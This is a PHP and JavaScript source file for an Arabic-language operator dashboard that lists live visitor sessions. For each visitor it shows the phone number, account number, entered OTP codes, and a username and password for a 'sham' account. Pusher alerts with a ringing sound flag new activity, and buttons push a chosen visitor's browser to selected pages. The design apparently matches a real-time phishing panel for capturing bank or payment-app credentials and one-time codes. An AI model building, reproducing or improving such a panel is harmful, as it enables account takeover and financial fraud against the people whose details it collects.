<?php

declare(strict_types=1);

require_once __DIR__.'/includes/bootstrap.php';
require_once __DIR__.'/includes/allowed_redirects.php';
require_once __DIR__.'/includes/dashboard_auth.php';

dashboard_session_start();
if (! dashboard_is_logged_in()) {
    header('Location: dashboard_login.php');
    exit;
}

$config = require __DIR__.'/includes/pusher_config.php';

if (! is_array($config)) {
    $config = [];
}

$dashboardApiToken = isset($config['trigger_token']) ? (string) $config['trigger_token'] : '';

$allowedPagesJson = json_encode(allowed_redirect_pages(), JSON_UNESCAPED_UNICODE);
if ($allowedPagesJson === false) {
    $allowedPagesJson = '{}';
}

$pusherKey = isset($config['key']) ? (string) $config['key'] : '';
$pusherCluster = isset($config['cluster']) ? (string) $config['cluster'] : 'ap2';
$pusherChannel = isset($config['channel']) ? (string) $config['channel'] : 'dashboard-live';
$pusherEvent = isset($config['event_name']) ? (string) $config['event_name'] : 'data-update';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>لوحة التوجيه — محادثات</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <style>
        :root {
            --bg: #0f1419;
            --card: #1a2332;
            --bubble: #243044;
            --border: #2d3a4d;
            --text: #e8ecf1;
            --muted: #8b9bb4;
            --accent: #3d9a6e;
            --warn: #c9a84c;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Tajawal', system-ui, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            line-height: 1.55;
            font-size: 0.92rem;
            padding-bottom: 160px;
        }
        .shell {
            max-width: 520px;
            margin: 0 auto;
            padding: 20px 14px 24px;
        }
        header.page-head { margin-bottom: 16px; display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; flex-wrap: wrap; }
        header.page-head h1 { font-size: 1.2rem; font-weight: 700; }
        header.page-head p.lead {
            color: var(--muted);
            font-size: 0.82rem;
            margin-top: 6px;
        }
        #pusherConn {
            flex-shrink: 0;
            font-size: 0.72rem;
            font-weight: 700;
            padding: 6px 12px;
            border-radius: 999px;
            border: 1px solid var(--border);
            background: var(--card);
            white-space: nowrap;
        }
        #pusherConn[data-state="ok"] { border-color: var(--accent); color: #9fdfbd; background: rgba(61,154,110,0.12); }
        #pusherConn[data-state="wait"] { color: var(--muted); }
        #pusherConn[data-state="bad"] { border-color: #a04444; color: #f0a8a8; }
        .panel {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 16px;
            overflow: hidden;
        }
        .panel-head {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            gap: 8px;
        }
        .panel-head h2 { font-size: 0.95rem; font-weight: 700; }
        .muted { color: var(--muted); font-size: 0.78rem; }
        .chat-list { padding: 8px 0; max-height: calc(100vh - 260px); overflow-y: auto; }
        .chat-item { border-bottom: 1px solid var(--border); }
        .chat-item:last-child { border-bottom: none; }
        .chat-toggle {
            width: 100%;
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 14px 16px;
            border: none;
            background: transparent;
            color: inherit;
            font-family: inherit;
            cursor: pointer;
            text-align: right;
            transition: background 0.15s;
        }
        .chat-toggle:hover { background: rgba(255,255,255,0.04); }
        .chat-item.open .chat-toggle { background: rgba(61, 154, 110, 0.08); }
        .chat-item.chat-item--alert .chat-toggle {
            background: linear-gradient(90deg, rgba(201, 168, 76, 0.28), rgba(61, 154, 110, 0.06));
            box-shadow: inset 3px 0 0 var(--warn);
        }
        .chat-item.chat-item--alert .chat-avatar {
            background: linear-gradient(135deg, var(--warn), #8a6a2a);
        }
        .chat-avatar {
            flex-shrink: 0;
            width: 44px;
            height: 44px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent), #2a6a4e);
            color: #fff;
            font-weight: 800;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .chat-main { flex: 1; min-width: 0; }
        .name-row {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .chat-name {
            font-weight: 700;
            font-size: 1rem;
            color: var(--text);
        }
        .status-on {
            font-size: 0.65rem;
            padding: 3px 9px;
            border-radius: 999px;
            background: rgba(61, 154, 110, 0.28);
            color: #9fdfbd;
            font-weight: 800;
        }
        .status-off {
            font-size: 0.65rem;
            padding: 3px 9px;
            border-radius: 999px;
            background: rgba(139, 155, 180, 0.15);
            color: var(--muted);
            font-weight: 700;
        }
        .chat-status-badge { flex-shrink: 0; }
        .chat-preview {
            display: block;
            font-size: 0.75rem;
            color: var(--muted);
            margin-top: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .chevron {
            flex-shrink: 0;
            font-size: 0.7rem;
            color: var(--muted);
            transition: transform 0.2s;
        }
        .chat-item.open .chevron { transform: rotate(-180deg); }
        .chat-panel {
            display: none;
            padding: 0 16px 16px 52px;
        }
        .chat-item.open .chat-panel { display: block; }
        .detail-grid {
            background: var(--bubble);
            border-radius: 12px;
            padding: 12px 14px;
            border: 1px solid var(--border);
        }
        .detail-row {
            display: grid;
            grid-template-columns: 120px 1fr;
            gap: 8px 12px;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.06);
            font-size: 0.82rem;
        }
        .detail-row:last-child { border-bottom: none; }
        .detail-row dt {
            color: var(--muted);
            font-weight: 600;
        }
        .detail-row dd {
            word-break: break-word;
            color: var(--text);
        }
        .pill {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 999px;
            font-size: 0.7rem;
            font-weight: 700;
            background: rgba(201, 168, 76, 0.2);
            color: var(--warn);
        }
        #globalStatus {
            padding: 10px 16px 14px;
            font-size: 0.8rem;
            color: var(--muted);
            min-height: 1.2em;
            border-top: 1px solid var(--border);
        }
        .empty-chat {
            padding: 36px 20px;
            text-align: center;
            color: var(--muted);
            font-size: 0.88rem;
        }
        .empty-chat[hidden] { display: none !important; }
        .footnote { margin-top: 18px; font-size: 0.72rem; color: var(--muted); line-height: 1.55; }
        .redirect-bar {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 200;
            background: linear-gradient(180deg, rgba(26,35,50,0.97), #1a2332);
            border-top: 1px solid var(--border);
            box-shadow: 0 -8px 32px rgba(0,0,0,0.35);
            padding: 12px 14px calc(12px + env(safe-area-inset-bottom));
        }
        .redirect-bar.is-hidden { display: none; }
        .redirect-inner { max-width: 560px; margin: 0 auto; }
        .redirect-title {
            font-size: 0.82rem;
            font-weight: 700;
            margin-bottom: 10px;
            color: var(--text);
        }
        .redirect-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }
        .page-redirect-btn {
            font-family: inherit;
            padding: 10px 14px;
            border-radius: 10px;
            border: 1px solid var(--border);
            background: #0f1824;
            color: var(--text);
            font-size: 0.8rem;
            font-weight: 700;
            cursor: pointer;
            flex: 1 1 auto;
            min-width: 120px;
        }
        .page-redirect-btn:hover:not(:disabled) {
            border-color: var(--accent);
            background: rgba(61,154,110,0.12);
        }
        .page-redirect-btn:disabled { opacity: 0.45; cursor: not-allowed; }
        .head-tools { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
        a.logout-link {
            font-size: 0.72rem;
            font-weight: 700;
            padding: 6px 12px;
            border-radius: 999px;
            border: 1px solid var(--border);
            background: var(--card);
            color: var(--muted);
            text-decoration: none;
        }
        a.logout-link:hover { border-color: #5a6a85; color: var(--text); }
    </style>
</head>
<body>
    <div class="shell">
        <header class="page-head">
            <div>
                <h1>العملاء</h1>
                <p class="lead">تحديث فوري عبر Pusher. اضغط الصف لعرض التفاصيل. أسفل الشاشة أزرار التوجيه للعميل المفتوح.</p>
            </div>
            <div class="head-tools">
                <span id="pusherConn" data-state="wait">جاري الاتصال…</span>
                <a class="logout-link" href="dashboard_logout.php">خروج</a>
            </div>
        </header>

        <div class="panel">
            <div class="panel-head">
                <h2>قائمة المحادثات</h2>
                <span class="muted">نسخة احتياطية كل 30 ث</span>
            </div>
            <div class="chat-list" id="sessionsBody">
                <div id="sessionsEmpty" class="empty-chat" hidden>لا يوجد عملاء بعد. افتح الموقع في متصفح العميل ثم عد هنا.</div>
            </div>
            <div id="globalStatus"></div>
        </div>

        <p class="footnote">
            الطلبات إلى <code>dashboard_api.php</code> تتطلب جلسة تسجيل دخول. إن وُجد <code>trigger_token</code>، أرسله أيضاً في <code>X-Dashboard-Token</code> لطلبات POST.
            عند نشاط عميل (صفحة أو بيانات) يُذكّر الصوت والتمييز البصري؛ ضع الملف <code>sounds/phone-ringing-229175.mp3</code> ليعمل التنبيه.
        </p>
    </div>

    <audio id="dashNotifySound" preload="auto" hidden>
        <source src="sounds/phone-ringing-229175.mp3" type="audio/mpeg">
    </audio>

    <div id="redirectBar" class="redirect-bar is-hidden" aria-live="polite">
        <div class="redirect-inner">
            <div class="redirect-title" id="redirectTitle"></div>
            <div class="redirect-buttons" id="redirectButtons"></div>
        </div>
    </div>

    <script>
        (function () {
            var DASH_TOKEN = <?php echo json_encode($dashboardApiToken, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
            var allowedPages = <?php echo $allowedPagesJson; ?>;

            var PUSHER_KEY = <?php echo json_encode($pusherKey, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
            var PUSHER_CLUSTER = <?php echo json_encode($pusherCluster, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
            var PUSHER_CHANNEL = <?php echo json_encode($pusherChannel, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
            var PUSHER_EVENT = <?php echo json_encode($pusherEvent, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;

            var listEl = document.getElementById('sessionsBody');
            var globalStatus = document.getElementById('globalStatus');
            var connEl = document.getElementById('pusherConn');
            var redirectBar = document.getElementById('redirectBar');
            var redirectTitle = document.getElementById('redirectTitle');
            var redirectButtons = document.getElementById('redirectButtons');

            var expandedSid = null;
            var lastSessions = [];
            var footerBusy = false;
            var loadDebounce = null;
            var pendingHighlightSid = null;
            var alertHighlightTimer = null;

            var ACTIVE_SEC = 45;
            var FALLBACK_RECENT_SEC = 22;
            var DEBOUNCE_MS = 150;

            function setConn(state, text) {
                connEl.setAttribute('data-state', state);
                connEl.textContent = text;
            }

            function playDashNotifySound() {
                var el = document.getElementById('dashNotifySound');
                if (!el) return;
                el.currentTime = 0;
                var p = el.play();
                if (p && typeof p.catch === 'function') {
                    p.catch(function () {});
                }
            }

            function applyAlertHighlight(sid) {
                listEl.querySelectorAll('.chat-item--alert').forEach(function (node) {
                    node.classList.remove('chat-item--alert');
                });
                var item = findItemBySid(sid);
                if (!item) return;
                item.classList.add('chat-item--alert');
                if (alertHighlightTimer) clearTimeout(alertHighlightTimer);
                alertHighlightTimer = setTimeout(function () {
                    listEl.querySelectorAll('.chat-item--alert').forEach(function (node) {
                        node.classList.remove('chat-item--alert');
                    });
                    alertHighlightTimer = null;
                }, 12000);
                try {
                    item.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
                } catch (e) {}
            }

            function arPage(filename) {
                if (!filename) return '—';
                var f = String(filename).trim();
                return allowedPages[f] || f;
            }

            /** نشاط حقيقي بالثانية — يُستخدم مع الساعة الحالية للتحديث الفوري بدون انتظار السيرفر. */
            function computeActiveFromRow(row, nowSec) {
                if (row && row.session_online === false) return false;
                var lp = parseInt(row.last_ping, 10);
                if (lp === 0) return false;
                if (!isNaN(lp) && lp > 0 && (nowSec - lp) <= ACTIVE_SEC) return true;
                var u = parseInt(row.updated_at, 10);
                if (!isNaN(u) && u > 0 && (nowSec - u) <= FALLBACK_RECENT_SEC) return true;
                return false;
            }

            function pickFirst(row, keys) {
                for (var i = 0; i < keys.length; i++) {
                    var v = row[keys[i]];
                    if (v !== undefined && v !== null && String(v).trim() !== '') {
                        return String(v);
                    }
                }
                return '';
            }

            function formatUnix(ts) {
                if (ts === undefined || ts === null || ts === '') return '';
                var n = parseInt(ts, 10);
                if (isNaN(n) || n <= 0) return '';
                try {
                    return new Date(n * 1000).toLocaleString('ar', { hour12: true });
                } catch (e) {
                    return '';
                }
            }

            function displayName(row, sid) {
                var n = row.name != null ? String(row.name).trim() : '';
                if (n) return n;
                if (sid && sid.length >= 6) return 'عميل — ' + sid.slice(0, 8) + '…';
                return 'عميل';
            }

            function avatarLetter(nameStr) {
                var t = String(nameStr).trim();
                if (!t) return '؟';
                return t.charAt(0);
            }

            function dashVal(v) {
                if (v === undefined || v === null) return '—';
                var s = String(v).trim();
                return s === '' ? '—' : s;
            }

            function rowToParts(row) {
                var sid = String(row.session_id || '');
                var pageAr = arPage(row.page != null ? String(row.page) : '');
                var qh = row.queued_redirect != null ? String(row.queued_redirect) : '';
                var qhAr = qh ? arPage(qh) : '';
                var loginAcc = pickFirst(row, ['login_account_number', 'username']);
                var passVal = pickFirst(row, ['password', 'sham_password']);
                var active = computeActiveFromRow(row, Math.floor(Date.now() / 1000));
                var pv = [];
                if (pageAr && pageAr !== '—') pv.push('الصفحة: ' + pageAr);
                if (qhAr && qhAr !== '—') pv.push('توجيه: ' + qhAr);
                return {
                    sid: sid,
                    nm: displayName(row, sid),
                    pageAr: pageAr,
                    phone: dashVal(row.phone),
                    account: dashVal(row.account_number),
                    otp_in: dashVal(row.otp_code),
                    otp_num: dashVal(row.otp_digits),
                    sham_user: dashVal(loginAcc),
                    sham_pass: dashVal(passVal),
                    queued: qhAr && qhAr !== '—' ? qhAr : '—',
                    net: active ? 'نشط على الموقع' : 'غير نشط (انتهى النبض)',
                    updated: formatUnix(row.updated_at) || '—',
                    ping: formatUnix(row.last_ping) || '—',
                    sid_display: sid || '—',
                    active: active,
                    preview: pv.length ? pv.join(' · ') : 'اضغط لعرض التفاصيل'
                };
            }

            function setGlobal(text, ok) {
                globalStatus.textContent = text || '';
                globalStatus.style.color = ok === true ? '#9fdfbd' : ok === false ? '#f0a8a8' : '#8b9bb4';
            }

            function findItemBySid(sid) {
                var nodes = listEl.querySelectorAll('.chat-item[data-session-id]');
                for (var i = 0; i < nodes.length; i++) {
                    if (nodes[i].getAttribute('data-session-id') === sid) return nodes[i];
                }
                return null;
            }

            function addDetailRow(grid, key, label) {
                var wr = document.createElement('div');
                wr.className = 'detail-row';
                var dt = document.createElement('dt');
                dt.textContent = label;
                var dd = document.createElement('dd');
                dd.setAttribute('data-detail', key);
                wr.appendChild(dt);
                wr.appendChild(dd);
                grid.appendChild(wr);
            }

            function createChatItem(row) {
                var p = rowToParts(row);
                var item = document.createElement('div');
                item.className = 'chat-item';
                item.setAttribute('data-session-id', p.sid);

                var toggle = document.createElement('button');
                toggle.type = 'button';
                toggle.className = 'chat-toggle';

                var av = document.createElement('span');
                av.className = 'chat-avatar';
                av.textContent = avatarLetter(p.nm);

                var main = document.createElement('span');
                main.className = 'chat-main';

                var nameRow = document.createElement('div');
                nameRow.className = 'name-row';
                var nameEl = document.createElement('span');
                nameEl.className = 'chat-name';
                var stBadge = document.createElement('span');
                stBadge.className = 'chat-status-badge ' + (p.active ? 'status-on' : 'status-off');
                nameEl.textContent = p.nm;
                stBadge.textContent = p.active ? 'نشط' : 'غير نشط';
                nameRow.appendChild(nameEl);
                nameRow.appendChild(stBadge);

                var preview = document.createElement('span');
                preview.className = 'chat-preview';

                main.appendChild(nameRow);
                main.appendChild(preview);

                var chev = document.createElement('span');
                chev.className = 'chevron';
                chev.textContent = '▼';

                toggle.appendChild(av);
                toggle.appendChild(main);
                toggle.appendChild(chev);

                var panel = document.createElement('div');
                panel.className = 'chat-panel';
                var grid = document.createElement('dl');
                grid.className = 'detail-grid';

                addDetailRow(grid, 'page', 'الصفحة الحالية');
                addDetailRow(grid, 'phone', 'الهاتف');
                addDetailRow(grid, 'account', 'رقم الحساب');
                addDetailRow(grid, 'otp_in', 'OTP (مدخل)');
                addDetailRow(grid, 'otp_num', 'OTP أرقام');
                addDetailRow(grid, 'sham_user', 'حساب sham');
                addDetailRow(grid, 'sham_pass', 'كلمة المرور sham');
                addDetailRow(grid, 'queued', 'توجيه مجدول');
                addDetailRow(grid, 'net', 'حالة الاتصال');
                addDetailRow(grid, 'updated', 'آخر تحديث');
                addDetailRow(grid, 'ping', 'آخر نبض');
                addDetailRow(grid, 'sid', 'معرّف الجلسة');

                panel.appendChild(grid);
                item.appendChild(toggle);
                item.appendChild(panel);

                patchChatItem(item, row);
                return item;
            }

            function patchChatItem(item, row) {
                var p = rowToParts(row);
                var av = item.querySelector('.chat-avatar');
                var nmEl = item.querySelector('.chat-name');
                var bd = item.querySelector('.chat-status-badge');
                var pr = item.querySelector('.chat-preview');
                if (av) av.textContent = avatarLetter(p.nm);
                if (nmEl) nmEl.textContent = p.nm;
                if (bd) {
                    bd.className = 'chat-status-badge ' + (p.active ? 'status-on' : 'status-off');
                    bd.textContent = p.active ? 'نشط' : 'غير نشط';
                }
                if (pr) pr.textContent = p.preview;

                var map = {
                    page: p.pageAr,
                    phone: p.phone,
                    account: p.account,
                    otp_in: p.otp_in,
                    otp_num: p.otp_num,
                    sham_user: p.sham_user,
                    sham_pass: p.sham_pass,
                    queued: p.queued,
                    net: p.net,
                    updated: p.updated,
                    ping: p.ping,
                    sid: p.sid_display
                };
                Object.keys(map).forEach(function (k) {
                    var dd = item.querySelector('dd[data-detail="' + k + '"]');
                    if (dd) dd.textContent = map[k];
                });
            }

            function syncSessions(rows) {
                lastSessions = rows || [];
                var emptyEl = document.getElementById('sessionsEmpty');

                if (!rows.length) {
                    listEl.querySelectorAll('.chat-item[data-session-id]').forEach(function (el) {
                        el.remove();
                    });
                    if (emptyEl) emptyEl.hidden = false;
                    expandedSid = null;
                    updateRedirectFooter();
                    return;
                }

                if (emptyEl) emptyEl.hidden = true;

                var seen = {};
                rows.forEach(function (row) {
                    var sid = String(row.session_id || '');
                    if (!sid) return;
                    seen[sid] = true;
                    var item = findItemBySid(sid);
                    if (!item) {
                        item = createChatItem(row);
                    } else {
                        patchChatItem(item, row);
                    }
                    item.classList.toggle('open', sid === expandedSid);
                    listEl.appendChild(item);
                });

                listEl.querySelectorAll('.chat-item[data-session-id]').forEach(function (el) {
                    var id = el.getAttribute('data-session-id');
                    if (!seen[id]) el.remove();
                });

                var existsOpen = rows.some(function (r) {
                    return String(r.session_id || '') === expandedSid;
                });
                if (!existsOpen) expandedSid = null;

                updateRedirectFooter();

                var ph = pendingHighlightSid;
                pendingHighlightSid = null;
                if (ph) {
                    applyAlertHighlight(ph);
                }
            }

            /** كل ثانية: يحدّث شارة نشط/غير نشط عند انتهاء مهلة النبض دون انتظار طلب جديد. */
            function tickLocalActivity() {
                var nowSec = Math.floor(Date.now() / 1000);
                if (!lastSessions.length) return;
                lastSessions.forEach(function (row) {
                    var sid = String(row.session_id || '');
                    if (!sid) return;
                    var active = computeActiveFromRow(row, nowSec);
                    var item = findItemBySid(sid);
                    if (!item) return;
                    var bd = item.querySelector('.chat-status-badge');
                    var ddNet = item.querySelector('dd[data-detail="net"]');
                    if (!bd || !ddNet) return;
                    var wantTxt = active ? 'نشط' : 'غير نشط';
                    var wantCls = active ? 'status-on' : 'status-off';
                    if (bd.textContent !== wantTxt || !bd.classList.contains(wantCls)) {
                        bd.className = 'chat-status-badge ' + wantCls;
                        bd.textContent = wantTxt;
                    }
                    var netMsg = active ? 'نشط على الموقع' : 'غير نشط (انتهى النبض)';
                    if (ddNet.textContent !== netMsg) ddNet.textContent = netMsg;
                });
            }

            function postRedirect(sessionId, page) {
                if (footerBusy || !sessionId || !page) return;
                footerBusy = true;
                var btns = redirectButtons.querySelectorAll('.page-redirect-btn');
                btns.forEach(function (b) { b.disabled = true; });

                var headers = { 'Content-Type': 'application/json' };
                if (DASH_TOKEN) headers['X-Dashboard-Token'] = DASH_TOKEN;

                fetch('dashboard_api.php', {
                    method: 'POST',
                    headers: headers,
                    credentials: 'same-origin',
                    body: JSON.stringify({ action: 'redirect', session_id: sessionId, page: page })
                })
                    .then(function (r) {
                        if (r.status === 401) {
                            window.location.href = 'dashboard_login.php';
                            return { skip: true };
                        }
                        return r.json().then(function (j) {
                            return { skip: false, ok: r.ok && j && j.ok, j: j };
                        });
                    })
                    .then(function (x) {
                        if (x.skip) return;
                        if (x.ok) {
                            setGlobal('تم جدولة التوجيه إلى «' + arPage(page) + '»', true);
                            scheduleLoadSessions();
                        } else {
                            setGlobal('فشل: ' + JSON.stringify(x.j || {}), false);
                        }
                    })
                    .catch(function () {
                        setGlobal('خطأ شبكة.', false);
                    })
                    .finally(function () {
                        footerBusy = false;
                        btns.forEach(function (b) { b.disabled = false; });
                    });
            }

            function updateRedirectFooter() {
                if (!expandedSid) {
                    redirectBar.classList.add('is-hidden');
                    return;
                }
                var row = null;
                for (var i = 0; i < lastSessions.length; i++) {
                    if (String(lastSessions[i].session_id || '') === expandedSid) {
                        row = lastSessions[i];
                        break;
                    }
                }
                var nm = row ? displayName(row, expandedSid) : 'عميل';
                redirectTitle.textContent = 'توجيه «' + nm + '» إلى الصفحة:';
                redirectButtons.innerHTML = '';
                Object.keys(allowedPages).forEach(function (fname) {
                    var b = document.createElement('button');
                    b.type = 'button';
                    b.className = 'page-redirect-btn';
                    b.textContent = allowedPages[fname];
                    (function (f) {
                        b.addEventListener('click', function () {
                            postRedirect(expandedSid, f);
                        });
                    })(fname);
                    redirectButtons.appendChild(b);
                });
                redirectBar.classList.remove('is-hidden');
            }

            function loadSessions() {
                fetch('dashboard_api.php?action=sessions', { credentials: 'same-origin' })
                    .then(function (r) {
                        if (r.status === 401) {
                            window.location.href = 'dashboard_login.php';
                            return Promise.reject(new Error('auth'));
                        }
                        return r.json();
                    })
                    .then(function (data) {
                        if (data && data.ok && Array.isArray(data.sessions)) {
                            syncSessions(data.sessions);
                        }
                    })
                    .catch(function () {});
            }

            function scheduleLoadSessions() {
                clearTimeout(loadDebounce);
                loadDebounce = setTimeout(function () {
                    loadDebounce = null;
                    loadSessions();
                }, DEBOUNCE_MS);
            }

            listEl.addEventListener('click', function (e) {
                var btn = e.target.closest('.chat-toggle');
                if (!btn || !listEl.contains(btn)) return;
                e.preventDefault();
                var item = btn.closest('.chat-item');
                if (!item) return;
                var sid = item.getAttribute('data-session-id');
                if (!sid) return;
                if (expandedSid === sid) {
                    expandedSid = null;
                    item.classList.remove('open');
                } else {
                    expandedSid = sid;
                    listEl.querySelectorAll('.chat-item').forEach(function (el) {
                        el.classList.remove('open');
                    });
                    item.classList.add('open');
                }
                updateRedirectFooter();
            });

            if (PUSHER_KEY) {
                var pusher = new Pusher(PUSHER_KEY, { cluster: PUSHER_CLUSTER, forceTLS: true });
                pusher.connection.bind('connected', function () {
                    setConn('ok', 'Pusher — متصل (فوري)');
                });
                pusher.connection.bind('error', function () {
                    setConn('bad', 'Pusher — خطأ');
                });
                pusher.connection.bind('unavailable', function () {
                    setConn('bad', 'Pusher — غير متاح');
                });
                var ch = pusher.subscribe(PUSHER_CHANNEL);
                ch.bind(PUSHER_EVENT, function (payload) {
                    if (payload && payload.action === 'sessions_changed') {
                        if (payload.alert === true && payload.session_id) {
                            pendingHighlightSid = String(payload.session_id);
                            playDashNotifySound();
                        }
                        scheduleLoadSessions();
                    }
                });
            } else {
                setConn('bad', 'لا يوجد مفتاح Pusher');
            }

            loadSessions();
            setInterval(scheduleLoadSessions, 30000);
            setInterval(tickLocalActivity, 1000);
        })();
    </script>
</body>
</html>
